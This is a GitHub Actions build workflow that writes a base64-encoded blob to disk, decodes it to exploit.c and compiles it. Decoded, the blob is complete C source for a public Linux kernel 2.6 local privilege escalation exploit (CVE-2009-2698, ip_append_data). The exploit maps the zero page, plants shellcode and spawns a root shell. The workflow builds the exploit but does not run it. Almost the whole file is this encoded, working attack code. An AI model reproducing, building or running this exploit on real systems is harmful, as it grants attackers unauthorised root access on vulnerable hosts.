name: Build

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-20.04

    steps:
      - name: Install glibc-2.3.4
        run: |
          sudo apt-get update
          sudo apt-get install -y libc6-dev-i386
      - name: Change working directory
        run: cd ${{github.workspace}}
      - name: Create C code
        run: echo LyoNKiogaHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvOTU0Mg0qKiAweDgyLUNWRS0yMDA5LTI2OTgNKiogTGludXgga2VybmVsIDIuNiA8IDIuNi4xOSAoMzJiaXQpIGlwX2FwcGVuZF9kYXRhKCkgbG9jYWwgcmluZzAgcm9vdCBleHBsb2l0DSoqDSoqIFRlc3RlZCBXaGl0ZSBCb3ggNCgyLjYuOS01LkVMc21wKSwNKiogQ2VudE9TIDQuNCgyLjYuOS00Mi5FTHNtcCksIENlbnRPUyA0LjUoMi42LjktNTUuRUxzbXApLA0qKiBGZWRvcmEgQ29yZSA0KDIuNi4xMS0xLjEzNjlfRkM0c21wKSwgRmVkb3JhIENvcmUgNSgyLjYuMTUtMS4yMDU0X0ZDNSksDSoqIEZlZG9yYSBDb3JlIDYoMi42LjE4LTEuMjc5OC5mYzYpLg0qKg0qKiAtLQ0qKiBEaXNjb3ZlcmVkIGJ5IFRhdmlzIE9ybWFuZHkgYW5kIEp1bGllbiBUaW5uZXMgb2YgdGhlIEdvb2dsZSBTZWN1cml0eSBUZWFtLg0qKiBUaGFua2Z1bCB0byB0aGVtLg0qKg0qKiAtLQ0qKiBiYXNoJCBnY2MgLW8gMHg4Mi1DVkUtMjAwOS0yNjk4IDB4ODItQ1ZFLTIwMDktMjY5OC5jICYmIC4vMHg4Mi1DVkUtMjAwOS0yNjk4DSoqIHNoLTMuMSMgaWQNKiogdWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTUwMCh4ODIpIGNvbnRleHQ9dXNlcl91OnN5c3RlbV9yOnVuY29uZmluZWRfdA0qKiBzaC0zLjEjDSoqIC0tDSoqIGV4cGxvaXQgYnkgPHAwYzczbjEoYXQpZ21haWwoZG90KWNvbT4uDSoqDSovDS8vIE9TQ1AgUHJpdmlsZWdlIEVzY2FsYXRpb24uDQ0jaW5jbHVkZSA8c3RkaW8uaD4NI2luY2x1ZGUgPHVuaXN0ZC5oPg0jaW5jbHVkZSA8c3RyaW5nLmg+DSNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+DSNpbmNsdWRlIDxzeXMvbW1hbi5oPg0jaW5jbHVkZSA8ZmNudGwuaD4NI2luY2x1ZGUgPHN5cy9wZXJzb25hbGl0eS5oPg0NdW5zaWduZWQgaW50IHVpZCwgZ2lkOw12b2lkIGdldF9yb290X3VpZCh1bnNpZ25lZCAqdGFzaykNew0JdW5zaWduZWQgKmFkZHI9dGFzazsNCXdoaWxlKGFkZHJbMF0hPXVpZHx8YWRkclsxXSE9dWlkfHxhZGRyWzJdIT11aWR8fGFkZHJbM10hPXVpZCl7DQkJYWRkcisrOw0JfQ0JYWRkclswXT1hZGRyWzFdPWFkZHJbMl09YWRkclszXT0wOyAvKiBzZXQgdWlkcyAqLw0JYWRkcls0XT1hZGRyWzVdPWFkZHJbNl09YWRkcls3XT0wOyAvKiBzZXQgZ2lkcyAqLw0JcmV0dXJuOw19DXZvaWQgZXhwbG9pdCgpOw12b2lkIGtlcm5lbF9jb2RlKCkNew0JYXNtKCJleHBsb2l0OlxuIg0JCSJwdXNoICVlYXhcbiINCQkibW92bCAkMHhmZmZmZjAwMCwlZWF4XG4iDQkJImFuZGwgJWVzcCwlZWF4XG4iDQkJInB1c2hsICglZWF4KVxuIg0JCSJjYWxsIGdldF9yb290X3VpZFxuIg0JCSJhZGRsICQ0LCVlc3BcbiINCQkicG9wbCAlZWF4XG4iKTsNCXJldHVybjsNfQ12b2lkICprZXJuZWw9a2VybmVsX2NvZGU7DQ1pbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpDXsNCWludCBmZD0wOw0JY2hhciBidWZbMTAyNF07DQlzdHJ1Y3Qgc29ja2FkZHIgeDB4Ow0Jdm9pZCAqemVyb19wYWdlOw0NCXVpZD1nZXR1aWQoKTsNCWdpZD1nZXRnaWQoKTsNCWlmKHVpZD09MCl7DQkJZnByaW50ZihzdGRlcnIsIlstXSBjaGVjayB1ciB1aWRcbiIpOw0JCXJldHVybiAtMTsNCX0NCWlmKHBlcnNvbmFsaXR5KDB4ZmZmZmZmZmYpPT1QRVJfU1ZSNCl7DQkJaWYobXByb3RlY3QoMHgwMDAwMDAwMCwweDEwMDAsUFJPVF9SRUFEfFBST1RfV1JJVEV8UFJPVF9FWEVDKT09LTEpew0JCQlwZXJyb3IoIlstXSBtcHJvdGVjdCgpIik7DQkJCXJldHVybiAtMTsNCQl9DQl9DQllbHNlIGlmKCh6ZXJvX3BhZ2U9bW1hcCgweDAwMDAwMDAwLDB4MTAwMCxQUk9UX1JFQUR8UFJPVF9XUklURXxQUk9UX0VYRUMsTUFQX0ZJWEVEfE1BUF9BTk9OWU1PVVN8TUFQX1BSSVZBVEUsMCwwKSk9PU1BUF9GQUlMRUQpew0JCQlwZXJyb3IoIlstXSBtbWFwKCkiKTsNCQkJcmV0dXJuIC0xOw0JfQ0JKih1bnNpZ25lZCBsb25nICopMHgwPTB4OTA5MDkwOTA7DQkqKGNoYXIgKikweDAwMDAwMDA0PTB4OTA7IC8qICsxICovDQkqKGNoYXIgKikweDAwMDAwMDA1PTB4ZmY7DQkqKGNoYXIgKikweDAwMDAwMDA2PTB4MjU7DQkqKHVuc2lnbmVkIGxvbmcgKikweDAwMDAwMDA3PSh1bnNpZ25lZCBsb25nKSZrZXJuZWw7DQkqKGNoYXIgKikweDAwMDAwMDBiPTB4YzM7DQ0JaWYoKGZkPXNvY2tldChQRl9JTkVULFNPQ0tfREdSQU0sMCkpPT0tMSl7DQkJcGVycm9yKCJbLV0gc29ja2V0KCkiKTsNCQlyZXR1cm4gLTE7DQl9DQl4MHguc2FfZmFtaWx5PUFGX1VOU1BFQzsNCW1lbXNldCh4MHguc2FfZGF0YSwweDgyLDE0KTsNCW1lbXNldCgoY2hhciAqKWJ1ZiwwLHNpemVvZihidWYpKTsNCXNlbmR0byhmZCxidWYsMTAyNCxNU0dfUFJPWFl8TVNHX01PUkUsJngweCxzaXplb2YoeDB4KSk7DQlzZW5kdG8oZmQsYnVmLDEwMjQsMCwmeDB4LHNpemVvZih4MHgpKTsNCWlmKGdldHVpZCgpPT11aWQpew0JCXByaW50ZigiWy1dIGV4cGxvaXQgZmFpbGVkLCB0cnkgYWdhaW5cbiIpOw0JCXJldHVybiAtMTsNCX0NCWNsb3NlKGZkKTsNCWV4ZWNsKCIvYmluL3NoIiwic2giLCItaSIsTlVMTCk7DQlyZXR1cm4gMDsNfQ0NLyogZW9jICovDQ0vLyBtaWx3MHJtLmNvbSBbMjAwOS0wOC0zMV0NICAgICAgICAgICAg > exploit.txt
      - name: Decode code
        run: base64 -d exploit.txt | tee exploit.c
      - name: Build C code
        run: gcc -m32 -o exploit /home/runner/work/Linux-Kernel-2.6-2.6.19-Ring0-Privilege-Escalation/exploit.c
